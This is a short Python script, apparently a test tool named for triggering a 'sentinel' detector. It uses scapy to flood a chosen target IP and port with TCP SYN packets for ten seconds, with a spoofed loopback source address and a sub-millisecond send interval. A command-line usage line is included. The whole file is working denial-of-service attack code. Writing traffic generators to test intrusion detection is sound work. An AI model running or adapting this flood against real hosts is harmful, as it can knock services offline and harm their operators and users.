# sentinel_trigger_attack.py
import sys
import time
import random
from scapy.all import IP, TCP, send


def sentinel_trigger(target_ip, target_port, duration=10):
    sport = 44444
    start = time.time()

    while time.time() - start < duration:
        send(
            IP(src="127.0.0.1", dst=target_ip) /
            TCP(sport=sport, dport=target_port, flags="S"),
            verbose=0,
            iface="lo"
        )
        time.sleep(0.0005)  # controlled flood

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python sentinel_trigger_attack.py <TARGET_IP> <TARGET_PORT>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    sentinel_trigger(target_ip, target_port)
